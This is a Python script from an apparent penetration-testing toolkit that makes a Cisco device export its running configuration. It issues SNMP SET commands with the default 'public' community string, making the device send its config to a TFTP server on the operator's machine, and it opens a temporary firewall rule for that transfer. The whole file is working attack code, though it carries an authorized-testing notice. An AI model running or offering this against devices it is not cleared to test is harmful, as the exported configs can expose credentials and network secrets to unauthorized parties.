# =============================================================================
# VAPT Toolkit - Vulnerability Assessment and Penetration Testing Toolkit
# =============================================================================
#
# Author: Keith Pachulski
# Company: Red Cell Security, LLC
# Email: keith@redcellsecurity.org
# Website: www.redcellsecurity.org
#
# Copyright (c) 2025 Keith Pachulski. All rights reserved.
#
# License: This software is licensed under the MIT License.
#          You are free to use, modify, and distribute this software
#          in accordance with the terms of the license.
#
# Purpose: This script provides an automated installation and management system
#          for a vulnerability assessment and penetration testing
#          toolkit. It installs and configures security tools across multiple
#          categories including exploitation, web testing, network scanning,
#          mobile security, cloud security, and Active Directory testing.
#
# DISCLAIMER: This software is provided "as-is," without warranty of any kind,
#             express or implied, including but not limited to the warranties
#             of merchantability, fitness for a particular purpose, and non-infringement.
#             In no event shall the authors or copyright holders be liable for any claim,
#             damages, or other liability, whether in an action of contract, tort, or otherwise,
#             arising from, out of, or in connection with the software or the use or other dealings
#             in the software.
#
# NOTICE: This toolkit is intended for authorized security testing only.
#         Users are responsible for ensuring compliance with all applicable laws
#         and regulations. Unauthorized use of these tools may violate local,
#         state, federal, and international laws.
#
# =============================================================================
#!/usr/bin/env python3

import os
import socket
import subprocess
from pysnmp.hlapi import *


# ----------------------------------------------------
# System Helper Functions
# ----------------------------------------------------

def run_cmd(cmd):
    """Run a shell command and return stdout as string."""
    try:
        result = subprocess.run(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        return result.stdout.strip(), result.stderr.strip()
    except Exception as e:
        return "", str(e)


# ----------------------------------------------------
# TFTP & UFW CHECKS
# ----------------------------------------------------

def check_tftpd():
    print("[*] Checking if tftpd-hpa is installed...")

    stdout, stderr = run_cmd(["which", "in.tftpd"])

    if stdout.strip():
        print("[+] tftpd-hpa is installed.")
        return True
    else:
        print("[!] tftpd-hpa is NOT installed.")
        print("    Install with:\n    sudo apt install tftpd-hpa\n")
        return False


def is_ufw_installed():
    stdout, stderr = run_cmd(["which", "ufw"])
    return bool(stdout.strip())


def is_ufw_active():
    stdout, stderr = run_cmd(["sudo", "ufw", "status"])
    return "Status: active" in stdout


def ufw_rule_exists():
    """Check whether UDP/69 is already allowed for TFTP."""
    stdout, stderr = run_cmd(["sudo", "ufw", "status", "numbered"])
    return "69/udp" in stdout.lower()


def ufw_allow_tftp():
    print("[*] Allowing TFTP (UDP/69) through UFW...")
    stdout, stderr = run_cmd(["sudo", "ufw", "allow", "69/udp"])
    print(stdout)
    return True


def ufw_remove_tftp_rule():
    """Remove TFTP rule only if added by this script."""
    print("[*] Removing temporary TFTP UFW rule...")

    # Get numbered rules
    stdout, stderr = run_cmd(["sudo", "ufw", "status", "numbered"])

    lines = stdout.split("\n")
    for line in lines:
        if "69/udp" in line.lower():
            # Extract rule number: e.g. "[ 3] 69/udp ALLOW ..."
            num = line.strip().split()[0].strip("[]")
            _stdout, _stderr = run_cmd(["sudo", "ufw", "delete", num])
            print(_stdout)
            return True

    print("[*] No TFTP rule to remove.")
    return False


# ----------------------------------------------------
# IP DETECTION
# ----------------------------------------------------

def get_local_ip():
    print("[*] Detecting local IP address...")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.connect(("8.8.8.8", 80))
        local_ip = sock.getsockname()[0]
        sock.close()
        print(f"[+] Local IP Address: {local_ip}")
        return local_ip
    except Exception as e:
        print(f"[!] Unable to determine local IP: {e}")
        return None


# ----------------------------------------------------
# SNMP / Cisco Copy Setup
# ----------------------------------------------------

ccCopyEntry = "1.3.6.1.4.1.9.9.96.1.1.1.1"
ccCopyProtocol = ccCopyEntry + ".2"
ccCopySourceFileType = ccCopyEntry + ".3"
ccCopyDestFileType = ccCopyEntry + ".4"
ccCopyServerAddress = ccCopyEntry + ".5"
ccCopyFileName = ccCopyEntry + ".6"
ccCopyEntryRowStatus = ccCopyEntry + ".14"

RUNNING_CONFIG = 4
NETWORK_TFTP = 1
ROW_CREATE_AND_GO = 4

def snmp_set(oid, value, ip, community):
    return next(
        setCmd(
            SnmpEngine(),
            CommunityData(community),
            UdpTransportTarget((ip, 161), timeout=3, retries=3),
            ContextData(),
            ObjectType(ObjectIdentity(oid), value)
        )
    )


def create_copy_job(switch_ip, tftp_ip, community="public"):
    job_id = 12345

    print(f"[+] Creating SNMP ccCopy job ID {job_id}...")

    sets = [
        (f"{ccCopyProtocol}.{job_id}", Integer(1)),
        (f"{ccCopySourceFileType}.{job_id}", Integer(RUNNING_CONFIG)),
        (f"{ccCopyDestFileType}.{job_id}", Integer(NETWORK_TFTP)),
        (f"{ccCopyServerAddress}.{job_id}", IpAddress(tftp_ip)),
        (f"{ccCopyFileName}.{job_id}", OctetString("running-config-backup.cfg")),
        (f"{ccCopyEntryRowStatus}.{job_id}", Integer(ROW_CREATE_AND_GO))
    ]

    for oid, val in sets:
        errorIndication, errorStatus, errorIndex, varBinds = snmp_set(
            oid, val, switch_ip, community
        )

        if errorIndication:
            print(f"[!] SNMP Error: {errorIndication}")
            return False

        if errorStatus:
            print(f"[!] SNMP Error: {errorStatus.prettyPrint()}")
            return False

    print("[+] SNMP TFTP export triggered successfully.")
    print("[+] Check your TFTP directory for: running-config-backup.cfg")
    return True


# ----------------------------------------------------
# MAIN PROGRAM
# ----------------------------------------------------

if __name__ == "__main__":
    print("\n--- Cisco SNMP Running-Config Downloader ---\n")

    # 1. Check for tftp
    if not check_tftpd():
        exit(1)

    # 2. Detect local IP
    local_ip = get_local_ip()
    if not local_ip:
        print("[!] Could not determine local IP. Exiting.")
        exit(1)

    # 3. Get Cisco switch IP
    switch_ip = input("Enter the IP address of the Cisco device: ").strip()

    # ----------------------------------------------------
    # UFW HANDLING
    # ----------------------------------------------------
    added_rule = False

    if is_ufw_installed() and is_ufw_active():
        print("[*] UFW is installed and active.")

        if not ufw_rule_exists():
            print("[*] TFTP is NOT allowed through UFW. Adding temporary rule.")
            ufw_allow_tftp()
            added_rule = True
        else:
            print("[*] UFW already allows TFTP. No rule added.")
    else:
        print("[*] UFW not installed or not active. Skipping firewall adjustments.")

    # ----------------------------------------------------
    # Perform SNMP copy
    # ----------------------------------------------------
    success = create_copy_job(
        switch_ip=switch_ip,
        tftp_ip=local_ip,
        community="public"
    )

    # ----------------------------------------------------
    # Remove temporary UFW rule
    # ----------------------------------------------------
    if added_rule:
        print("[*] Cleaning up UFW temporary rule...")
        ufw_remove_tftp_rule()

    if success:
        print("\n[+] Operation complete.\n")
    else:
        print("\n[!] Operation failed.\n")
